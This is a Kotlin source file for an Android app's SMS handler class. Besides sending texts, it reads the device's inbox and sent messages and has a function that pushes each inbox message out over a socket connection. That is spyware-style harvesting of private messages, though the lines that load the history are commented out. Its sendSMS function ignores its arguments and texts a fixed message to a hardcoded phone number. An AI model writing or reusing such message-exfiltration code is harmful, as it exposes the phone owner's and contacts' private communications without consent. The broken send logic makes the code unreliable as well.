package com.example.myphone.util

import android.app.Activity
import android.app.PendingIntent
import android.content.*
import android.net.Uri
import android.telephony.SmsManager
import android.util.Log
import android.widget.Toast
import com.example.myphone.interfaces.ISMSMessages

class SMSMessagesHandler(private val context: Context) : ISMSMessages {
    private val inboxMessages = arrayListOf<String>()
    private val sentMessages = arrayListOf<String>()

    init {
//        inboxMessages.addAll(getSMSHistory(context.contentResolver, SMSType.INBOX))
//        sentMessages.addAll(getSMSHistory(context.contentResolver, SMSType.SENT))
    }

    override fun onSMSReceived() {

    }

    override fun onSMSSent() {
        Log.d("SMS", "Sent")
        Toast.makeText(context, "Successfully sent message!", Toast.LENGTH_SHORT).show()
    }

    fun sendSMS(number: String, body: String) {
        val sentPendingIntent =
            PendingIntent.getBroadcast(context, 0, Intent(SMSStatus.SENT.status), 0)
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(p0: Context?, p1: Intent?) {
                when(resultCode) {
                    Activity.RESULT_OK -> {
                       onSMSSent()
                    }
                    else -> {
                        Log.d("SMS", resultCode.toString())
                    }
                }
            }

        }
        context.registerReceiver(receiver, IntentFilter(SMSStatus.SENT.status))
//        val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            context.getSystemService(SmsManager::class.java)
//        } else {
            val smsManager = SmsManager.getDefault()
//        }

//        val separatedBody = smsManager.divideMessage(body)
        smsManager.sendTextMessage("+84366569597", null, "huhu anh ui", null, null)
    }

    fun sendSMSHistory() {
        for (mes in inboxMessages) {
            SocketConnection.sendStringData(mes, mes.length)
        }
    }

    private fun getSMSHistory(contentResolver: ContentResolver, type: SMSType): ArrayList<String> {
        val res = arrayListOf<String>()
        val cursor = contentResolver.query(Uri.parse(type.type), null, null, null, null)
            ?: return res
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                var msgData = ""
                val indices = arrayOf(0, 2, 4, 7, 12)
                for (idx in indices) {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)
                }
                Log.d("msgData", msgData)
                res.add(msgData)
            } while (cursor.moveToNext())
        } else {
            // empty box, no SMS
        }
        cursor.close()
        return res
    }

    companion object {
        const val TAG = "SMSMessagesHandler"
    }

    enum class SMSType(val type: String) {
        INBOX("content://sms/inbox"),
        SENT("content://sms/sent")
    }

    enum class SMSStatus(val status: String) {
        SENT("SMS_SENT"),
        DELIVERED("SMS_DELIVERED")
    }
}